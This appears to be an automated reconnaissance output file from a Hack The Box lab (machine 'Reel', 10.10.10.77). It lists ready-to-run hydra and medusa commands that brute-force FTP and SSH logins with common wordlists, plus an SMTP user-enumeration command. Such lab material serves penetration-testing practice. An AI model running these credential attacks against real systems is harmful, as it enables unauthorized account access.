```bash
[*] ftp on tcp/21

	[-] Bruteforce logins:

		hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 21 -o "/home/Default/Documents/Repos/cerberus-bytes/Cerberus-bytes/HacktheBox/machines/hard/reel/results/10.10.10.77/scans/tcp21/tcp_21_ftp_hydra.txt" ftp://10.10.10.77

		medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 21 -O "/home/Default/Documents/Repos/cerberus-bytes/Cerberus-bytes/HacktheBox/machines/hard/reel/results/10.10.10.77/scans/tcp21/tcp_21_ftp_medusa.txt" -M ftp -h 10.10.10.77

[*] ssh on tcp/22

	[-] Bruteforce logins:

		hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 22 -o "/home/Default/Documents/Repos/cerberus-bytes/Cerberus-bytes/HacktheBox/machines/hard/reel/results/10.10.10.77/scans/tcp22/tcp_22_ssh_hydra.txt" ssh://10.10.10.77

		medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 22 -O "/home/Default/Documents/Repos/cerberus-bytes/Cerberus-bytes/HacktheBox/machines/hard/reel/results/10.10.10.77/scans/tcp22/tcp_22_ssh_medusa.txt" -M ssh -h 10.10.10.77

[*] smtp on tcp/25

	[-] Try User Enumeration using "RCPT TO". Replace <TARGET-DOMAIN> with the target's domain name:

		hydra smtp-enum://10.10.10.77:25/rcpt -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -o "/home/Default/Documents/Repos/cerberus-bytes/Cerberus-bytes/HacktheBox/machines/hard/reel/results/10.10.10.77/scans/tcp25/tcp_25_smtp_user-enum_hydra_rcpt.txt" -p <TARGET-DOMAIN>


```